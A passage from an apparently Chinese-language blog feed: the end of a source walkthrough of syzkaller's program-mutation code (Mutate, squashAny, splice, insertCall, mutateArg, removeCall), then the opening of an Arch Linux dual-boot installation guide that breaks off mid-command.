class="hljs-params">(r *randGen)</span></span> generateCall(s *state, p *Prog, insertionPoint <span class="hljs-type">int</span>) []*Call &#123;<br>biasCall := <span class="hljs-number">-1</span><br><span class="hljs-keyword">if</span> insertionPoint &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Choosing the base call is based on the insertion point of the new calls sequence.</span><br>insertionCall := p.Calls[r.Intn(insertionPoint)].Meta<br><span class="hljs-keyword">if</span> !insertionCall.Attrs.NoGenerate &#123;<br><span class="hljs-comment">// We must be careful not to bias towards a non-generatable call.</span><br>biasCall = insertionCall.ID<br>&#125;<br>&#125;<br>idx := s.ct.choose(r.Rand, biasCall)<br>meta := r.target.Syscalls[idx]<br><span class="hljs-keyword">return</span> r.generateParticularCall(s, meta)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="【核心】prog-Mutate-：变异一个输入程序"><a href="#【核心】prog-Mutate-：变异一个输入程序" class="headerlink" title="【核心】prog.Mutate()：变异一个输入程序"></a>【核心】prog.Mutate()：变异一个输入程序</h3><p>该函数的核心其实是一个<strong>随机变异</strong>的循环，这里的变量 <code>r</code> 为一个随机数生成器：</p><ul><li>生成一个 <code>[0, 5)</code> 之间的随机数，若为 0 则执行 <code>mutator.squashAny()</code> </li><li>上一条未命中，则生成一个  <code>[0, 100)</code> 间随机数，若 &gt;&#x3D; 1 则执行 <code>mutator.splice()</code></li><li>上一条未命中，则生成一个 <code> [0, 31)</code> 间随机数，若 &gt;&#x3D; 20 则执行 <code>mutator.insertCall()</code></li><li>上一条未命中，则生成一个 <code>[0, 11)</code> 间随机数，若 &gt;&#x3D; 10 则执行 <code>mutateArg()</code></li><li>皆未命中，执行 <code>mutator.removeCall()</code></li></ul><p>终止循环的条件是 <code>上述变异操作之一成功执行 &amp; 系统调用数不为 0</code> ，此外还有 2&#x2F;3 的概率重新进入循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Mutate program p.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// p:           要变异的程序.</span><br><span class="hljs-comment">// rs:          随机数资源池.</span><br><span class="hljs-comment">// ncalls:      变异后程序中允许的最大调用数量.</span><br><span class="hljs-comment">// ct:          系统调用的 ChoiceTable.</span><br><span class="hljs-comment">// noMutate:    一组不该被变异的系统调用的 ID 集合.</span><br><span class="hljs-comment">// corpus:      包括原始程序 p 的整个语料库.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Prog)</span></span> Mutate(rs rand.Source, ncalls <span class="hljs-type">int</span>, ct *ChoiceTable, noMutate <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span>, corpus []*Prog) &#123;<br>r := newRand(p.Target, rs)<br><span class="hljs-keyword">if</span> ncalls &lt; <span class="hljs-built_in">len</span>(p.Calls) &#123;<br>ncalls = <span class="hljs-built_in">len</span>(p.Calls)<br>&#125;<br>ctx := &amp;mutator&#123;<br>p:        p,<br>r:        r,<br>ncalls:   ncalls,<br>ct:       ct,<br>noMutate: noMutate,<br>corpus:   corpus,<br>&#125;<br><span class="hljs-keyword">for</span> stop, ok := <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>; !stop; stop = ok &amp;&amp; <span class="hljs-built_in">len</span>(p.Calls) != <span class="hljs-number">0</span> &amp;&amp; r.oneOf(<span class="hljs-number">3</span>) &#123;<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> r.oneOf(<span class="hljs-number">5</span>):<br><span class="hljs-comment">// Not all calls have anything squashable,</span><br><span class="hljs-comment">// so this has lower priority in reality.</span><br>ok = ctx.squashAny()<br><span class="hljs-keyword">case</span> r.nOutOf(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>ok = ctx.splice()<br><span class="hljs-keyword">case</span> r.nOutOf(<span class="hljs-number">20</span>, <span class="hljs-number">31</span>):<br>ok = ctx.insertCall()<br><span class="hljs-keyword">case</span> r.nOutOf(<span class="hljs-number">10</span>, <span class="hljs-number">11</span>):<br>ok = ctx.mutateArg()<br><span class="hljs-keyword">default</span>:<br>ok = ctx.removeCall()<br>&#125;<br>&#125;<br>p.sanitizeFix()<br>p.debugValidate()<br><span class="hljs-keyword">if</span> got := <span class="hljs-built_in">len</span>(p.Calls); got &lt; <span class="hljs-number">1</span> || got &gt; ncalls &#123;<br><span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;bad number of calls after mutation: %v, want [1, %v]&quot;</span>, got, ncalls))<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们来看这五个不同的变异方案</p><h4 id="mutator-squashAny-：随机变异一个系统调用的参数"><a href="#mutator-squashAny-：随机变异一个系统调用的参数" class="headerlink" title="mutator.squashAny()：随机变异一个系统调用的参数"></a>mutator.squashAny()：随机变异一个系统调用的参数</h4><p>该函数一开始会调用 <code>Prog.complexPtr()</code>，其中主要会调用 <code>ForEachArg()</code> 遍历用例程序的参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 选择一个随机的复杂指针并将其参数变为 ANY.</span><br><span class="hljs-comment">// 之后，若 ANY 中包含有 blob，变异一个随机的 blob.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> squashAny() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br>complexPtrs := p.complexPtrs()<br></code></pre></td></tr></table></figure><p>传入给 <code>ForEachArg()</code> 的回调函数主要调用 <code>isComplexPtr()</code> 判断每个调用的参数中是否存在复杂指针（多级指针），若是，则将该调用添加到作为返回值的数组中，<strong>即这个函数其实主要是针对多级指针的变异</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Prog)</span></span> complexPtrs() (res []complexPtr) &#123;<br><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> p.Calls &#123;<br>ForeachArg(c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(arg Arg, ctx *ArgCtx)</span></span> &#123;<br><span class="hljs-keyword">if</span> ptrArg, ok := arg.(*PointerArg); ok &amp;&amp; p.Target.isComplexPtr(ptrArg) &#123;<br>res = <span class="hljs-built_in">append</span>(res, complexPtr&#123;ptrArg, c&#125;)<br>ctx.Stop = <span class="hljs-literal">true</span><br>&#125;<br>&#125;)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>接下来会从返回列表中随机选择一个指针，若其对应的调用不允许变异则直接返回，若非指针则调用 <code>squashPtr()</code> </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">ptr := complexPtrs[r.Intn(<span class="hljs-built_in">len</span>(complexPtrs))]<br><span class="hljs-keyword">if</span> ctx.noMutate[ptr.call.Meta.ID] &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">if</span> !p.Target.isAnyPtr(ptr.arg.Type()) &#123;<br>p.Target.squashPtr(ptr.arg)<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来会调用 <code>ForEachSubArg()</code>（本质上为 <code>ForEachArgImpl()</code> 的封装），对之前随机选取的系统调用的参数进行遍历，这里传入的回调函数主要是检查 <code>arg.Dir()</code> 是否为 <code>DirOut</code>，若没有一个参数符合则直接返回 <code>false</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> blobs []*DataArg<br><span class="hljs-keyword">var</span> bases []*PointerArg<br>ForeachSubArg(ptr.arg, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(arg Arg, ctx *ArgCtx)</span></span> &#123;<br><span class="hljs-keyword">if</span> data, ok := arg.(*DataArg); ok &amp;&amp; arg.Dir() != DirOut &#123;<br>blobs = <span class="hljs-built_in">append</span>(blobs, data)<br>bases = <span class="hljs-built_in">append</span>(bases, ctx.Base)<br>&#125;<br>&#125;)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(blobs) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>最后一部分主要是调用 <code>analyze()</code> 进行分析，之后调用 <code>mutateData()</code> 来对参数的数据进行变异，以及对指针的更新</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 注意: 我们需要在变异之前调用 analyze.</span><br><span class="hljs-comment">// 在变异后其可以增长到超过数据区域的范围，</span><br><span class="hljs-comment">// 在标记现有分配时 analyze 将为 OOB 访问崩溃.</span><br>s := analyze(ctx.ct, ctx.corpus, p, ptr.call)<br><span class="hljs-comment">// TODO(dvyukov): 我们可能想要为 ANY 弄一个特别的变异.</span><br><span class="hljs-comment">// 例如，合并相邻的 ANYBLOBs (我们并不创造他们,</span><br><span class="hljs-comment">// 但他们能在将来出现); 或是用一个 blob 替代 ANYRES</span><br><span class="hljs-comment">// (并使用相邻的 blobs 将其合并).</span><br>idx := r.Intn(<span class="hljs-built_in">len</span>(blobs))<br>arg := blobs[idx]<br>base := bases[idx]<br>baseSize := base.Res.Size()<br>arg.data = mutateData(r, arg.Data(), <span class="hljs-number">0</span>, maxBlobLen)<br><span class="hljs-comment">// 若 size 变大了则更新基指针.</span><br><span class="hljs-keyword">if</span> baseSize &lt; base.Res.Size() &#123;<br>newArg := r.allocAddr(s, base.Type(), base.Dir(), base.Res.Size(), base.Res)<br>*base = *newArg<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mutator-splice-：随机选取语料库中一个程序的系统调用插入到程序随机位置中"><a href="#mutator-splice-：随机选取语料库中一个程序的系统调用插入到程序随机位置中" class="headerlink" title="mutator.splice()：随机选取语料库中一个程序的系统调用插入到程序随机位置中"></a>mutator.splice()：随机选取语料库中一个程序的系统调用插入到程序随机位置中</h4><p>该函数为编译过程当中概率最大的主分支，不过其逻辑比较简短：</p><ul><li>首先从语料库中随机复制一个程序</li><li>选择一个随机下标 <code>idx</code> ，在待变异程序该下标处插入 <code>p0</code> 的系统调用组</li><li>从末尾移除多余的调用</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 译注：注释写得比较抽象这里就不贴了：）</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> splice() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ctx.corpus) == <span class="hljs-number">0</span> || <span class="hljs-built_in">len</span>(p.Calls) == <span class="hljs-number">0</span> || <span class="hljs-built_in">len</span>(p.Calls) &gt;= ctx.ncalls &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>p0 := ctx.corpus[r.Intn(<span class="hljs-built_in">len</span>(ctx.corpus))]<br>p0c := p0.Clone()<br>idx := r.Intn(<span class="hljs-built_in">len</span>(p.Calls))<br>p.Calls = <span class="hljs-built_in">append</span>(p.Calls[:idx], <span class="hljs-built_in">append</span>(p0c.Calls, p.Calls[idx:]...)...)<br><span class="hljs-keyword">for</span> i := <span class="hljs-built_in">len</span>(p.Calls) - <span class="hljs-number">1</span>; i &gt;= ctx.ncalls; i-- &#123;<br>p.RemoveCall(i)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mutator-insertCall-：随机生成一个系统调用插入到程序中随机位置"><a href="#mutator-insertCall-：随机生成一个系统调用插入到程序中随机位置" class="headerlink" title="mutator.insertCall()：随机生成一个系统调用插入到程序中随机位置"></a>mutator.insertCall()：随机生成一个系统调用插入到程序中随机位置</h4><p>该函数的逻辑也比较简短，若程序中调用数量已经达到 <code>ncalls</code> 的限制则直接返回，否则会先调用 <code>analyze()</code> 进行分析，随后调用 <code>generateCall()</code> 生成一个系统调用并插入到程序中的一个随机位置</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 在一个随机点（倾向于现有程序的末尾）插入一个随机调用</span><br><span class="hljs-comment">// 若该程序调用数量早已达到 ncalls（译注：限制数量）则不会插入）</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> insertCall() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(p.Calls) &gt;= ctx.ncalls &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>idx := r.biasedRand(<span class="hljs-built_in">len</span>(p.Calls)+<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)<br><span class="hljs-keyword">var</span> c *Call<br><span class="hljs-keyword">if</span> idx &lt; <span class="hljs-built_in">len</span>(p.Calls) &#123;<br>c = p.Calls[idx]<br>&#125;<br>s := analyze(ctx.ct, ctx.corpus, p, c)<br>calls := r.generateCall(s, p, idx)<br>p.insertBefore(c, calls)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &gt; ctx.ncalls &#123;<br>p.RemoveCall(idx)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="mutator-mutateArg-：随机变异程序中某一系统调用的参数"><a href="#mutator-mutateArg-：随机变异程序中某一系统调用的参数" class="headerlink" title="mutator.mutateArg()：随机变异程序中某一系统调用的参数"></a>mutator.mutateArg()：随机变异程序中某一系统调用的参数</h4><p>该函数的主要作用便是随机变异程序中某一系统调用的参数，这里就不深入展开分析了，感兴趣可以直接看源码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> mutateArg() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(p.Calls) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br>idx := chooseCall(p, r)<br><span class="hljs-keyword">if</span> idx &lt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>c := p.Calls[idx]<br><span class="hljs-keyword">if</span> ctx.noMutate[c.Meta.ID] &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>updateSizes := <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> stop, ok := <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>; !stop; stop = ok &amp;&amp; r.oneOf(<span class="hljs-number">3</span>) &#123;<br>ok = <span class="hljs-literal">true</span><br>ma := &amp;mutationArgs&#123;target: p.Target&#125;<br>ForeachArg(c, ma.collectArg)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ma.args) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>s := analyze(ctx.ct, ctx.corpus, p, c)<br>arg, argCtx := ma.chooseArg(r.Rand)<br>calls, ok1 := p.Target.mutateArg(r, s, arg, argCtx, &amp;updateSizes)<br><span class="hljs-keyword">if</span> !ok1 &#123;<br>ok = <span class="hljs-literal">false</span><br><span class="hljs-keyword">continue</span><br>&#125;<br>p.insertBefore(c, calls)<br>idx += <span class="hljs-built_in">len</span>(calls)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &gt; ctx.ncalls &#123;<br>idx--<br>p.RemoveCall(idx)<br>&#125;<br><span class="hljs-keyword">if</span> idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-built_in">len</span>(p.Calls) || p.Calls[idx] != c &#123;<br><span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;wrong call index: idx=%v calls=%v p.Calls=%v ncalls=%v&quot;</span>,<br>idx, <span class="hljs-built_in">len</span>(calls), <span class="hljs-built_in">len</span>(p.Calls), ctx.ncalls))<br>&#125;<br><span class="hljs-keyword">if</span> updateSizes &#123;<br>p.Target.assignSizesCall(c)<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="mutator-removeCall-：随机移除程序中的一个系统调用"><a href="#mutator-removeCall-：随机移除程序中的一个系统调用" class="headerlink" title="mutator.removeCall()：随机移除程序中的一个系统调用"></a>mutator.removeCall()：随机移除程序中的一个系统调用</h4><p>该函数也比较简短，主要就是随机移除程序中的一个系统调用，如果程序中没有系统调用则不会进行移除操作：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> removeCall() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(p.Calls) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>idx := r.Intn(<span class="hljs-built_in">len</span>(p.Calls))<br>p.RemoveCall(idx)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>至此，syz-fuzzer 主体源码逻辑分析完毕</p><blockquote><p>简单总结的话，笔者感觉其实主要都是偏工程性的东西比较多🤔</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;（摘下眼镜）Furry？（戴上眼镜）Fuzzer！&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/categories/FUZZ/"/>
    
    
    <category term="漏洞挖掘" scheme="https://arttnba3.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
    <category term="syzkaller" scheme="https://arttnba3.github.io/tags/syzkaller/"/>
    
  </entry>
  
  <entry>
    <title>【DISTRO.0x00】从零开始的 Arch Linux 生活</title>
    <link href="https://arttnba3.github.io/2023/09/25/DISTRO-0X00-INSTALL_ARCH_WINDOWS/"/>
    <id>https://arttnba3.github.io/2023/09/25/DISTRO-0X00-INSTALL_ARCH_WINDOWS/</id>
    <published>2023-09-24T15:25:17.000Z</published>
    <updated>2024-05-05T15:14:11.006Z</updated>
    
    <content type="html"><![CDATA[<p>不好用，在安装界面睡了三个小时</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>本科阶段笔者一直用的 Windows 作为主力系统并使用 VMWare Workstation 运行 Linux 虚拟机，但总感觉不够得劲，可惜笔者有一些硬性需求只能在 Windows 上完成（比如说游戏、绘图等），由于仅有一台电脑的缘故，再加上众所周知 Surface 系统对于 Linux 的支持一直不太好，所以一直没有机会在真机上安装 Linux 操作系统 ：(</p><p>开始读 Phd 之后老板比较阔气大手一挥直接配了一个新的笔记本用来工作，于是笔者决定这一次直接在真机上安装 Linux ，专门用来做工作上的事情</p><p>关于发行版的选择，笔者决定选择安装 <a href="https://archlinux.org/">Arch Linux</a>，因为其有着较为完备的各类文档及驱动适配等，同时笔者的新笔记本的牌子为华硕，其同样有一个较为完善的<a href="https://asus-linux.org/">第三方社区</a>支持</p><p>不过考虑到有些工作可能还是在 Windows 上做会比较方便（例如调试 Windows 程序），再加上原装的 Windows 系统毕竟是收了笔者的钱的，直接抹掉的话未免有点可惜（笑），所以笔者最终的策略是<strong>安装 Windows + Linux 双系统，日常主力还是使用 Linux 系统</strong></p><h1 id="0x01-安装前的准备工作"><a href="#0x01-安装前的准备工作" class="headerlink" title="0x01. 安装前的准备工作"></a>0x01. 安装前的准备工作</h1><h3 id="制作-Arch-Linux-物理安装媒介"><a href="#制作-Arch-Linux-物理安装媒介" class="headerlink" title="制作 Arch Linux 物理安装媒介"></a>制作 Arch Linux 物理安装媒介</h3><p>首先在 <a href="https://archlinux.org/download/">https://archlinux.org/download/</a> 下载最新的 Arch Linux 镜像，这里提供了几个镜像站，可以直接选离你最近的那一个：）</p><p>完成镜像下载之后直接烧录到 U 盘上即可，这里笔者用的是 <a href="https://etcher.balena.io/">balenaEtcher</a> ：</p><p><img src="https://s2.loli.net/2023/09/18/5lqvTSMEXz4xmQr.png"></p><h3 id="关闭-Secure-Boot"><a href="#关闭-Secure-Boot" class="headerlink" title="关闭 Secure Boot"></a>关闭 Secure Boot</h3><p>由于 Arch Linux 的安装媒介暂不支持安全启动，因此这里我们需要将电脑的这个特性暂且关闭</p><p>华硕笔记本进入 BIOS 的方法为：首先摁住 <code>F2</code>，然后按一下开机键，一直到 BIOS 界面出现后松开 <code>F2</code> 即可</p><p>点击 <code>进阶设置→安全性</code>，把 <code>安全启动控制</code> 改为 <code>关闭</code> 即可：</p><p><img src="https://s2.loli.net/2023/09/18/wsMylQKgk9XA4WR.jpg" alt="关闭安全启动"></p><h3 id="分配-Linux-磁盘空间"><a href="#分配-Linux-磁盘空间" class="headerlink" title="分配 Linux 磁盘空间"></a>分配 Linux 磁盘空间</h3><p>直接右键 <code>我的电脑→显示更多选项→管理→磁盘管理</code> 拉一块空的区域出来就行：</p><p><img src="https://s2.loli.net/2023/09/18/tn92KjiBeLA7Zv8.jpg"></p><h1 id="0x02-安装-Arch-Linux"><a href="#0x02-安装-Arch-Linux" class="headerlink" title="0x02. 安装 Arch Linux"></a>0x02. 安装 Arch Linux</h1><blockquote><p>主要还是参照<a href="https://wiki.archlinux.org/title/installation_guide">官方文档</a>来弄</p></blockquote><h3 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h3><p>首先还是进 BIOS 改启动顺序把安装介质调到第一位：</p><p><img src="https://s2.loli.net/2023/09/18/dTlZOjgPWbvE18z.png"></p><p>然后就来到了 <code>GRUB</code>，正常情况下直接选第一个就行：</p><p><img src="https://s2.loli.net/2023/09/18/og6ebnwTvEcGkHs.jpg"></p><p>如果你需要使用无线网络，可以输入如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">iwctl       <span class="hljs-comment"># 进入无线网络控制界面</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">device list <span class="hljs-comment"># 查看无线网卡信息</span></span><br></code></pre></td></tr></table></figure><p>笔者这里显示的网卡设备名是 <code>wlan0</code> ，接下来输入如下命令扫描附近的的无线网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">station wlan0 scan <span class="hljs-comment"># 扫描</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">station wlan0 get-networks <span class="hljs-comment"># 显示结果</span></span><br></code></pre></td></tr></table></figure><p>接下来使用 <code>connect</code> 参数进行连接，例如这里假设网络名为 <code>BeastSenbei</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">station wlan0 connect BeastSenbei <span class="hljs-comment"># 如果有密码则会要求你输入</span></span><br></code></pre></td></tr></table></figure><p>之后直接输入 <code>exit</code> 即可退出该界面</p><blockquote><p>你可以使用 <code>pacman -Syyy</code> 命令测试网络是否联通，若要换源则直接编辑 <code>/etc/pacman.d/mirrorlist</code> 文件即可</p></blockquote><h3 id="建立磁盘分区"><a href="#建立磁盘分区" class="headerlink" title="建立磁盘分区"></a>建立磁盘分区</h3><p>首先使用 <code>lsblk</code> 查看磁盘分区，这里看不到我们之前新划分的区域，因为还没划分一个新的分区：</p><p><img src="https://s2.loli.net/2023/09/18/ram95FjtBEIuD7p.jpg"></p><p>接下来我们使用如下命令进行新分区的建立，注意根据你自己的磁盘设备名进行输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">cfdisk /dev/nvme0n1</span><br></code></pre></td></tr></table></figure><p>可以看到一个 <code>Free Space</code>，选中并选择 <code>[New]</code> 即可，默认直接敲两下回车就是用所有的空间，你也可以选择手动输入自己想要划分的分区大小，完成之后在下面选择 <code>[Write]</code> 然后输入 <code>yes</code> 即可：</p><p><img src="https://s2.loli.net/2023/09/18/EX81wkHmfjbWMF6.jpg"></p><p>接下来将该分区格式化为 <code>ext4</code> 格式，这里注意分区别选错了，不记得的就重新再看看 <code>lsblk</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">mkfs.ext4 